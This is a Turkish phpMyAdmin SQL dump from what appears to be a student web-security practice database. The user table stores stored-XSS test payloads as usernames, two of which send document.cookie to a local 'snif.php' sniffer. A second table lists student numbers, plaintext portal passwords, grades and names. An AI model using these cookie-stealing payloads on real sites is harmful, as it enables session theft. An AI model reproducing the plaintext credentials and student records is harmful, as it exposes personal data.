-- phpMyAdmin SQL Dump
-- version 4.6.4
-- https://www.phpmyadmin.net/
--
-- Anamakine: 127.0.0.1
-- Üretim Zamanı: 29 Nis 2017, 16:28:38
-- Sunucu sürümü: 5.7.14
-- PHP Sürümü: 5.6.25

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Veritabanı: `guvenlilk`
--

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `kullanici`
--

CREATE TABLE `kullanici` (
  `id` int(11) NOT NULL,
  `kullaniciAdi` varchar(600) NOT NULL,
  `mail` varchar(50) NOT NULL,
  `parola` varchar(50) NOT NULL,
  `yorum` varchar(500) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Tablo döküm verisi `kullanici`
--

INSERT INTO `kullanici` (`id`, `kullaniciAdi`, `mail`, `parola`, `yorum`) VALUES
(1, 'msy', 'msy_34@hotmail.com', 'msy', NULL),
(2, 'alex', 'aaa313@alex.com', '123', NULL),
(3, '<script>alert(1);</script>', 'mmm@m.com', '1', NULL),
(4, 'memoli', 'mmm@m.com', '1', NULL),
(5, '<script>location.href="http://127.0.0.1:8080/guvenlik/logs/snif.php?cookie="+document_cookie+"\\n"</script>', 'hirsiz@hirsiz.com', '111', NULL),
(6, '<iframe id="ifrm" src="cookie" style="display:none"></iframe>  <script>$(document).ready(function() { $("#ifrm").attr("src", ("http://127.0.0.1:8080/guvenlik/logs/snif.php?cookie="+document.cookie)); }); </script>', 'aaa@asa.com', '123', NULL),
(7, 'merhaba', 'ddd@dd.com', '4545', NULL),
(8, 'yeni', 'yeni@yeni.com', 'yeni', NULL),
(9, 'deneme', 'dene@dene.com', 'dene', NULL),
(10, '<script>alert("Merhaba Kanka");</script>', 'script@dsa.com', '1', NULL),
(11, '<ScriPt> alert("yedimi");</scRiPt>', 'yedimi@hot.com', '1', NULL);

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `yazlabnotlar`
--

CREATE TABLE `yazlabnotlar` (
  `Id` int(11) NOT NULL,
  `OgrNu` varchar(9) NOT NULL,
  `ObsSifre` varchar(25) NOT NULL,
  `Puan` decimal(3,0) DEFAULT NULL,
  `AdSoyad` varchar(50) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Tablo döküm verisi `yazlabnotlar`
--

INSERT INTO `yazlabnotlar` (`Id`, `OgrNu`, `ObsSifre`, `Puan`, `AdSoyad`) VALUES
(1, '150202104', '19951995', '100', 'Mehmet Samet YILDIZ'),
(2, '130202098', '123456', '100', 'Cihan Savas'),
(3, '500500600', '123456', '42', 'Terim Soydan'),
(4, '300520012', '123789', '65', 'Ay?e Bozkurt');

--
-- Dökümü yapılmış tablolar için indeksler
--

--
-- Tablo için indeksler `kullanici`
--
ALTER TABLE `kullanici`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `yazlabnotlar`
--
ALTER TABLE `yazlabnotlar`
  ADD PRIMARY KEY (`Id`);

--
-- Dökümü yapılmış tablolar için AUTO_INCREMENT değeri
--

--
-- Tablo için AUTO_INCREMENT değeri `kullanici`
--
ALTER TABLE `kullanici`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=12;
--
-- Tablo için AUTO_INCREMENT değeri `yazlabnotlar`
--
ALTER TABLE `yazlabnotlar`
  MODIFY `Id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
